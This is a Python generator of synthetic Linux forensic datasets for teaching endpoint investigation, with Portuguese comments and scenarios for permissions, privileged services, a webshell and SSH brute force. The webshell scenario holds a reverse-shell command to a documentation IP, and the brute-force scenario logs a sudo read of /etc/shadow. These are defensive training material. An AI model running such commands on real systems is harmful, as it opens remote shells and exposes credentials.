#!/usr/bin/env python3
"""
Endpoint Investigator - Training Dataset Generator

Gera datasets sintéticos para treinamento e testes de uma ferramenta de
investigação de endpoints Linux. Os datasets são fictícios e não representam
incidentes reais.

VERSÃO ADAPTADA PELO GRUPO (o original está em generate_dataset_original.py):
  * CORREÇÃO: random_noise() reaproveitava dicts já criados por build() como se
    fossem tuplas e abortava com "ValueError: too many values to unpack";
  * CORREÇÃO: scenario_permission era rotulado como "normal" no metadata.json;
  * 3 cenários novos: webshell, bruteforce e writable_dir (connections.csv opcional);
  * --scenario NOME força um cenário específico.

Uso:
  python3 generate_dataset.py --level basic --output training/basic-001
  python3 generate_dataset.py --level intermediate --output training/intermediate-001
  python3 generate_dataset.py --level challenge --output training/challenge-001 --seed 42
  python3 generate_dataset.py --batch 10 --level intermediate --output training/

Níveis:
  basic       - cenários simples e pouco ambíguos
  intermediate- mistura situações normais e achados relevantes
  challenge   - inclui relações ambíguas e ruído

O script produz:
  processes.csv
  permissions.csv
  services.txt
  journal.log
  README.txt
  metadata.json
"""

from __future__ import annotations

import argparse
import csv
import json
import random
import string
from datetime import datetime, timedelta, timezone
from pathlib import Path


BASE_IPS = [
    "10.20.30.10", "10.20.30.11", "10.20.30.12", "10.20.30.20",
    "10.20.30.30", "10.20.30.40", "10.20.30.50",
]
REMOTE_IPS = ["198.51.100.12", "198.51.100.44", "203.0.113.25", "203.0.113.80"]
DOMAINS = [
    "updates.example.invalid",
    "metrics.example.invalid",
    "backup.example.invalid",
    "repo.example.invalid",
]


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S-03:00")


def rand_name(prefix: str, n: int = 6) -> str:
    chars = string.ascii_lowercase + string.digits
    return prefix + "-" + "".join(random.choice(chars) for _ in range(n))


def write_csv(path: Path, fieldnames: list[str], rows: list[dict[str, str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)


def scenario_normal(start: datetime) -> dict:
    processes = [
        (1, 0, "root", "Ss", "/sbin/init"),
        (612, 1, "root", "Ss", "/usr/sbin/sshd -D"),
        (701, 1, "root", "Ss", "/usr/sbin/cron -f"),
        (733, 1, "www-data", "S", "/usr/sbin/apache2 -k start"),
        (744, 733, "www-data", "S", "/usr/sbin/apache2 -k start"),
        (1204, 612, "aluno", "Ss", "sshd: aluno@pts/0"),
        (1212, 1204, "aluno", "S", "/bin/bash"),
        (1234, 1212, "aluno", "S", "/usr/bin/python3 /home/aluno/check.py"),
    ]
    permissions = [
        ("/opt/app", "directory", "root", "root", "0755"),
        ("/opt/app/check.py", "file", "root", "root", "0755"),
        ("/etc/shadow", "file", "root", "shadow", "0640"),
        ("/usr/local/bin/report-sync", "file", "root", "root", "0755"),
        ("/home/aluno/check.py", "file", "aluno", "aluno", "0755"),
    ]
    services = [
        ("ssh.service", "running", "root", "/usr/sbin/sshd -D"),
        ("apache2.service", "running", "root", "/usr/sbin/apachectl start"),
        ("cron.service", "running", "root", "/usr/sbin/cron -f"),
    ]
    logs = [
        (0, "systemd[1]: Started ssh.service - OpenBSD Secure Shell server."),
        (2, "systemd[1]: Started apache2.service - The Apache HTTP Server."),
        (8, "sshd[1204]: Accepted publickey for aluno from 10.20.30.44 port 51518 ssh2"),
        (10, "systemd-logind[640]: New session 7 of user aluno."),
        (15, "python3[1234]: routine check completed status=OK"),
    ]
    return build(start, processes, permissions, services, logs, "normal")


def scenario_permission(start: datetime) -> dict:
    d = scenario_normal(start)
    d["permissions"].extend([
        {"path": "/opt/reports/report.sh", "type": "file", "owner": "root", "group": "root", "mode": "0777", "mtime": iso(start - timedelta(days=2))},
        {"path": "/opt/reports", "type": "directory", "owner": "root", "group": "root", "mode": "0755", "mtime": iso(start - timedelta(days=3))},
    ])
    d["kind"] = "permission"  # CORREÇÃO: o original rotulava este cenário como "normal"
    d["readme_extra"] = (
        "Há uma permissão excessivamente ampla em um arquivo, mas o dataset não "
        "estabelece que ele seja executado por um serviço privilegiado. O aluno "
        "deve diferenciar configuração inadequada de evidência de exploração."
    )
    return d


def scenario_privileged_service(start: datetime) -> dict:
    processes = [
        (1, 0, "root", "Ss", "/sbin/init"),
        (612, 1, "root", "Ss", "/usr/sbin/sshd -D"),
        (821, 1, "root", "Ss", "/usr/sbin/cron -f"),
        (2417, 1, "root", "Ss", "/bin/bash /opt/backup/backup.sh"),
        (2421, 2417, "root", "S", "/usr/bin/curl -fsS https://updates.example.invalid/status"),
    ]
    permissions = [
        ("/opt/backup", "directory", "root", "root", "0755"),
        ("/opt/backup/backup.sh", "file", "root", "root", "0700"),
        ("/opt/backup/config.ini", "file", "root", "backup", "0640"),
    ]
    services = [
        ("ssh.service", "running", "root", "/usr/sbin/sshd -D"),
        ("cron.service", "running", "root", "/usr/sbin/cron -f"),
        ("backup-agent.service", "running", "root", "/bin/bash /opt/backup/backup.sh"),
    ]
    logs = [
        (0, "systemd[1]: Started ssh.service - OpenBSD Secure Shell server."),
        (60, "systemd[1]: Starting backup-agent.service - Internal Backup Agent..."),
        (63, "backup-agent[2417]: backup job started"),
        (64, "backup-agent[2417]: checking remote status endpoint"),
        (65, "backup-agent[2417]: backup completed with status=OK"),
        (66, "systemd[1]: backup-agent.service: Deactivated successfully."),
    ]
    d = build(start, processes, permissions, services, logs, "privileged_service")
    d["readme_extra"] = (
        "O serviço executa como root, mas o script está restrito a root. O objetivo "
        "é evitar a regra simplista 'serviço root = vulnerabilidade'."
    )
    return d


def scenario_correlation(start: datetime) -> dict:
    processes = [
        (1, 0, "root", "Ss", "/sbin/init"),
        (612, 1, "root", "Ss", "/usr/sbin/sshd -D"),
        (821, 1, "root", "Ss", "/usr/sbin/cron -f"),
        (2417, 1, "root", "Ss", "/bin/bash /opt/backup/backup.sh"),
        (2421, 2417, "root", "S", "/usr/bin/curl -fsS https://updates.example.invalid/status"),
        (2630, 612, "aluno", "Ss", "sshd: aluno@pts/0"),
        (2638, 2630, "aluno", "S", "/bin/bash"),
    ]
    permissions = [
        ("/opt/backup", "directory", "root", "root", "0755"),
        ("/opt/backup/backup.sh", "file", "root", "root", "0777"),
        ("/opt/backup/config.ini", "file", "root", "backup", "0640"),
        ("/usr/local/bin/report-sync", "file", "root", "root", "4755"),
    ]
    services = [
        ("ssh.service", "running", "root", "/usr/sbin/sshd -D"),
        ("cron.service", "running", "root", "/usr/sbin/cron -f"),
        ("backup-agent.service", "running", "root", "/bin/bash /opt/backup/backup.sh"),
    ]
    logs = [
        (0, "systemd[1]: Started ssh.service - OpenBSD Secure Shell server."),
        (120, "systemd[1]: Starting backup-agent.service - Internal Backup Agent..."),
        (123, "backup-agent[2417]: backup job started"),
        (124, "backup-agent[2417]: checking remote status endpoint"),
        (125, "backup-agent[2417]: backup completed with status=OK"),
        (1500, "sshd[2630]: Accepted publickey for aluno from 10.20.30.44 port 51518 ssh2"),
        (1502, "systemd-logind[640]: New session 9 of user aluno."),
    ]
    d = build(start, processes, permissions, services, logs, "correlation")
    d["readme_extra"] = (
        "Este é um cenário de correlação. A combinação serviço privilegiado + script "
        "world-writable deve gerar um finding de risco. O dataset não prova que houve exploração."
    )
    return d


def scenario_ambiguous(start: datetime) -> dict:
    processes = [
        (1, 0, "root", "Ss", "/sbin/init"),
        (612, 1, "root", "Ss", "/usr/sbin/sshd -D"),
        (901, 1, "root", "Ss", "/usr/sbin/cron -f"),
        (1500, 1, "root", "S", "/usr/bin/python3 /opt/monitor/agent.py"),
        (1510, 1500, "root", "S", "/usr/bin/curl -fsS https://metrics.example.invalid/v1/push"),
        (1632, 612, "aluno", "Ss", "sshd: aluno@pts/0"),
        (1640, 1632, "aluno", "S", "/bin/bash"),
        (1645, 1640, "aluno", "S", "/usr/bin/python3 /home/aluno/check.py"),
    ]
    permissions = [
        ("/opt/monitor", "directory", "root", "root", "0755"),
        ("/opt/monitor/agent.py", "file", "root", "root", "0755"),
        ("/home/aluno/check.py", "file", "aluno", "aluno", "0755"),
    ]
    services = [
        ("ssh.service", "running", "root", "/usr/sbin/sshd -D"),
        ("cron.service", "running", "root", "/usr/sbin/cron -f"),
        ("monitor-agent.service", "running", "root", "/usr/bin/python3 /opt/monitor/agent.py"),
    ]
    logs = [
        (0, "systemd[1]: Started ssh.service - OpenBSD Secure Shell server."),
        (20, "systemd[1]: Started monitor-agent.service - Monitoring Agent."),
        (22, "monitor-agent[1500]: sending metrics batch=12"),
        (25, "monitor-agent[1510]: remote status=200"),
        (1600, "sshd[1632]: Accepted publickey for aluno from 10.20.30.44 port 51590 ssh2"),
        (1615, "python3[1645]: check completed status=OK"),
    ]
    d = build(start, processes, permissions, services, logs, "ambiguous")
    d["readme_extra"] = (
        "Há uma conexão externa iniciada por um serviço root. Sem outras evidências, "
        "isso não deve ser tratado automaticamente como C2 ou malware. O aluno deve investigar contexto."
    )
    return d


def random_noise(start: datetime, seed: int) -> dict:
    """Gera um cenário intermediário aleatório a partir de padrões conhecidos."""
    random.seed(seed)
    base = scenario_normal(start)
    # CORREÇÃO: build() já converteu as listas em dicts/datetimes; volta às tuplas.
    processes = [(int(p["pid"]), int(p["ppid"]), p["user"], p["stat"], p["cmd"]) for p in base["processes"]]
    permissions = [(p["path"], p["type"], p["owner"], p["group"], p["mode"]) for p in base["permissions"]]
    services = list(base["services"])
    logs = [(int((dt - start).total_seconds()), msg) for dt, msg in base["logs"]]

    # Ajustes aleatórios de PID e uma situação de interesse.
    pid = random.randint(2000, 6000)
    service_name = random.choice(["backup-agent", "report-sync", "inventory-agent"])
    script = f"/opt/{service_name}/run.sh"
    owner = "root"
    mode = random.choice(["0750", "0700", "0770", "0777"])
    processes.append((pid, 1, "root", "Ss", f"/bin/bash {script}"))
    permissions.append((f"/opt/{service_name}", "directory", "root", "root", "0755"))
    permissions.append((script, "file", owner, "root", mode))
    services.append((f"{service_name}.service", "running", "root", f"/bin/bash {script}"))
    logs.append((random.randint(100, 300), f"systemd[1]: Started {service_name}.service - {service_name} service."))
    return build(start, processes, permissions, services, logs, "random")


# --------------------------------------------------------------------------- #
# Cenários adicionais (grupo)                                                  #
# --------------------------------------------------------------------------- #
def _extend(base: dict, kind: str, note: str, processes=(), permissions=(), services=(), logs=()) -> dict:
    """Acrescenta entidades a um cenário já construído (base = scenario_normal)."""
    start = datetime(2026, 9, 14, 9, 0, tzinfo=timezone.utc)
    extra = build(start, list(processes), list(permissions), list(services), list(logs), kind)
    for i, p in enumerate(extra["processes"]):   # continua a sequência de horários do snapshot
        p["timestamp"] = iso(start + timedelta(seconds=(len(base["processes"]) + i) * 2))
    for key in ("processes", "permissions", "services", "logs"):
        base[key] += extra[key]
    base["kind"], base["readme_extra"] = kind, note
    return base


def scenario_writable_dir(start: datetime) -> dict:
    """Script do serviço root está correto (0755 root), mas o diretório é 0777."""
    return _extend(
        scenario_normal(start), "writable_dir",
        "O arquivo está correto, mas o diretório que o contém é gravável por todos: "
        "o arquivo pode ser apagado e substituído.",
        processes=[(3301, 1, "root", "Ss", "/bin/bash /srv/sync/sync.sh")],
        permissions=[("/srv/sync", "directory", "root", "root", "0777"),
                     ("/srv/sync/sync.sh", "file", "root", "root", "0755")],
        services=[("data-sync.service", "running", "root", "/bin/bash /srv/sync/sync.sh")],
        logs=[(30, "systemd[1]: Started data-sync.service - Data Sync.")])


def scenario_webshell(start: datetime) -> dict:
    """Apache (www-data) abre sh -> bash -i com socket para IP externo."""
    d = _extend(
        scenario_normal(start), "webshell",
        "Um processo do Apache gerou um shell interativo com conexão para IP externo. "
        "A cadeia é forte, mas o dataset não mostra o tráfego trocado.",
        processes=[(5120, 744, "www-data", "S", "/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1'"),
                   (5121, 5120, "www-data", "S", "/bin/bash -i")],
        permissions=[("/var/www/html/uploads", "directory", "www-data", "www-data", "0755"),
                     ("/var/www/html/uploads/img.php", "file", "www-data", "www-data", "0644")],
        logs=[(900, "apache2[744]: [php:warn] system() called from /var/www/html/uploads/img.php")])
    d["connections"] = [("tcp", "ESTABLISHED", "10.20.30.10", 48122, "203.0.113.80", 4444, 5121),
                        ("tcp", "LISTEN", "0.0.0.0", 80, "", 0, 733),
                        ("tcp", "LISTEN", "0.0.0.0", 22, "", 0, 612)]
    return d


def scenario_bruteforce(start: datetime) -> dict:
    """Falhas de SSH de um IP externo, seguidas de login do mesmo IP e sudo."""
    users = ["root", "admin", "aluno", "aluno", "test", "aluno", "aluno", "aluno"]
    logs = [(300 + i * 3, f"sshd[{4000 + i}]: Failed password for {u} from 203.0.113.25 port {40000 + i} ssh2")
            for i, u in enumerate(users)]
    logs += [(330, "sshd[4410]: Accepted password for aluno from 203.0.113.25 port 40100 ssh2"),
             (331, "systemd-logind[640]: New session 12 of user aluno."),
             (360, "sudo[4450]:    aluno : TTY=pts/1 ; PWD=/home/aluno ; USER=root ; COMMAND=/bin/cat /etc/shadow")]
    return _extend(
        scenario_normal(start), "bruteforce",
        "Sequência de falhas de senha de um IP externo, login bem-sucedido do mesmo IP e uso de sudo.",
        processes=[(4410, 612, "aluno", "Ss", "sshd: aluno@pts/1"), (4418, 4410, "aluno", "S", "-bash")],
        logs=logs)


SCENARIOS = {
    "normal": scenario_normal, "permission": scenario_permission,
    "privileged_service": scenario_privileged_service, "correlation": scenario_correlation,
    "ambiguous": scenario_ambiguous, "random": random_noise,
    "writable_dir": scenario_writable_dir, "webshell": scenario_webshell, "bruteforce": scenario_bruteforce,
}


def build(start, processes, permissions, services, logs, kind):
    return {
        "kind": kind,
        "processes": [
            {"timestamp": iso(start + timedelta(seconds=i * 2)), "pid": str(pid), "ppid": str(ppid),
             "user": user, "stat": stat, "cmd": cmd}
            for i, (pid, ppid, user, stat, cmd) in enumerate(processes)
        ],
        "permissions": [
            {"path": path, "type": typ, "owner": owner, "group": group, "mode": mode,
             "mtime": iso(start - timedelta(days=(i % 12), minutes=i))}
            for i, (path, typ, owner, group, mode) in enumerate(permissions)
        ],
        "services": services,
        "logs": [
            (start + timedelta(seconds=offset), message) for offset, message in logs
        ],
        "readme_extra": "",
    }


def make_dataset(level: str, seed: int | None, out_dir: Path, scenario_name: str | None = None) -> None:
    if seed is not None:
        random.seed(seed)
    start = datetime(2026, 9, 14, 9, 0, tzinfo=timezone.utc)

    if scenario_name:
        fn = SCENARIOS[scenario_name]
        data = fn(start, random.randint(1, 100000)) if fn is random_noise else fn(start)
    elif level == "basic":
        choices = [scenario_normal, scenario_permission, scenario_privileged_service]
        scenario = random.choice(choices)
        data = scenario(start)
    elif level == "intermediate":
        choices = [scenario_permission, scenario_privileged_service, scenario_correlation, random_noise]
        scenario = random.choice(choices)
        if scenario is random_noise:
            data = scenario(start, random.randint(1, 100000))
        else:
            data = scenario(start)
    elif level == "challenge":
        choices = [scenario_correlation, scenario_ambiguous, random_noise]
        scenario = random.choice(choices)
        if scenario is random_noise:
            data = scenario(start, random.randint(1, 100000))
        else:
            data = scenario(start)
    else:
        raise ValueError(f"Nível desconhecido: {level}")

    out_dir.mkdir(parents=True, exist_ok=True)

    write_csv(
        out_dir / "processes.csv",
        ["timestamp", "pid", "ppid", "user", "stat", "cmd"],
        data["processes"],
    )
    write_csv(
        out_dir / "permissions.csv",
        ["path", "type", "owner", "group", "mode", "mtime"],
        data["permissions"],
    )

    with (out_dir / "services.txt").open("w", encoding="utf-8") as fh:
        fh.write("UNIT                         ACTIVE   USER      EXECSTART\n")
        for unit, active, user, execstart in data["services"]:
            fh.write(f"{unit:<28}{active:<9}{user:<10}{execstart}\n")

    if data.get("connections"):
        fields = ["proto", "state", "laddr", "lport", "raddr", "rport", "pid"]
        write_csv(out_dir / "connections.csv", fields, [dict(zip(fields, map(str, c))) for c in data["connections"]])

    with (out_dir / "journal.log").open("w", encoding="utf-8") as fh:
        for dt, message in sorted(data["logs"], key=lambda x: x[0]):
            fh.write(f"{dt.strftime('%b %d %H:%M:%S')} srv-app-01 {message}\n")

    metadata = {
        "dataset_type": "synthetic_training",
        "level": level,
        "scenario": data["kind"],
        "seed": seed,
        "generated_at": datetime.now().astimezone().isoformat(),
        "warning": "Dados fictícios para uso acadêmico; não representam um incidente real.",
    }
    (out_dir / "metadata.json").write_text(json.dumps(metadata, indent=2, ensure_ascii=False), encoding="utf-8")

    readme = [
        "ENDPOINT INVESTIGATOR - DATASET DE TREINAMENTO",
        "",
        "Este dataset é sintético e foi criado para testar ferramentas de investigação de endpoints Linux.",
        "Não representa um incidente real.",
        "",
        f"Nível: {level}",
        f"Cenário: {data['kind']}",
        "",
        "Arquivos:",
        "- processes.csv: snapshot de processos.",
        "- permissions.csv: metadados de arquivos e diretórios.",
        "- services.txt: serviços em execução.",
        "- journal.log: eventos de sistema.",
        "- metadata.json: metadados de geração.",
        "",
        "Orientação: não assuma que um único indicador é suficiente para concluir que houve comprometimento.",
        "Procure correlações e diferencie evidência, interpretação e hipótese.",
    ]
    if data["readme_extra"]:
        readme.extend(["", "Nota didática do cenário:", data["readme_extra"]])
    (out_dir / "README.txt").write_text("\n".join(readme) + "\n", encoding="utf-8")

    print(f"Dataset criado em: {out_dir}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Gera datasets sintéticos para Endpoint Investigator.")
    parser.add_argument("--level", choices=["basic", "intermediate", "challenge"], default="basic")
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), help="força um cenário específico")
    parser.add_argument("--output", default="./dataset", help="Diretório de saída.")
    parser.add_argument("--seed", type=int, default=None)
    parser.add_argument("--batch", type=int, default=1, help="Quantidade de datasets a gerar.")
    args = parser.parse_args()

    root = Path(args.output)
    if args.batch <= 1:
        make_dataset(args.level, args.seed, root, args.scenario)
        return

    root.mkdir(parents=True, exist_ok=True)
    for i in range(1, args.batch + 1):
        seed = (args.seed + i - 1) if args.seed is not None else random.randint(1, 10_000_000)
        make_dataset(args.level, seed, root / f"dataset-{i:03d}", args.scenario)


if __name__ == "__main__":
    main()
